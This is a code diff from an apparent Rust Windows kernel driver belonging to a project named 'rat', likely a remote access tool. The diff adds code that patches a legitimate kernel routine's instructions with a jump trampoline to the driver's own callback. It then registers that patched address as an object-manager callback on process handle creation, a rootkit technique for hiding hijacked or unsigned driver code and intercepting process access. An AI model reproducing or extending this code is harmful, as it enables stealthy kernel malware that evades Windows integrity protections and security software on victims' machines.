@@ -1,8 +1,10 @@
 use alloc::string::String;
 use core::ffi::c_void;
+use core::sync::atomic::Ordering;
 use core::{mem, ptr, slice};
 
-use rat_common::utils::DropGuard;
+use rat_common::kernel::KernelHandoff;
+use rat_common::utils::{DropGuard, insert_jmp_trampoline};
 use wdk::nt_success;
 use wdk_sys::_MODE::UserMode;
 use wdk_sys::_OB_PREOP_CALLBACK_STATUS::OB_PREOP_SUCCESS;
@@ -16,21 +18,40 @@ use wdk_sys::{
     PsProcessType, UNICODE_STRING,
 };
 
-use crate::global::ALTITUDE;
+use crate::global::{ALTITUDE, ORIGINAL_DRIVER_ENTRY_COMPLETED};
 use crate::trace;
+use crate::wrappers::mdl::MdlGuard;
 
-pub fn ob_register_callbacks() -> anyhow::Result<*mut c_void> {
+pub fn ob_register_callbacks(extra: &KernelHandoff) -> anyhow::Result<*mut c_void> {
     let mut altitude = UNICODE_STRING::default();
     unsafe {
         RtlInitUnicodeString(&mut altitude, ALTITUDE.as_ptr());
     }
 
+    anyhow::ensure!(
+        ORIGINAL_DRIVER_ENTRY_COMPLETED.load(Ordering::Acquire),
+        "Original DriverEntry hasn't completed yet. Cannot register callbacks.",
+    );
+
+    let mut size = 0;
+    let _ = insert_jmp_trampoline(&mut [], 0, None, Some(&mut size));
+    let guard = unsafe { MdlGuard::new(extra.rtl_random_addr.cast(), size as u32)? };
+    if !insert_jmp_trampoline(
+        guard.as_mut_slice(),
+        process_preop_callback as *const u8 as u64,
+        None,
+        None,
+    ) {
+        anyhow::bail!("Instructions overwriting failed (size = {size})");
+    }
+
     let mut object_operations = [OB_OPERATION_REGISTRATION {
         ObjectType: unsafe { PsProcessType },
         Operations: OB_OPERATION_HANDLE_CREATE,
-        PreOperation: Some(process_preop_callback),
+        PreOperation: Some(unsafe { mem::transmute(extra.rtl_random_addr) }),
         PostOperation: None,
     }];
+
     let mut object_callbacks = OB_CALLBACK_REGISTRATION {
         Version: OB_FLT_REGISTRATION_VERSION as u16,
         OperationRegistrationCount: object_operations.len() as u16,
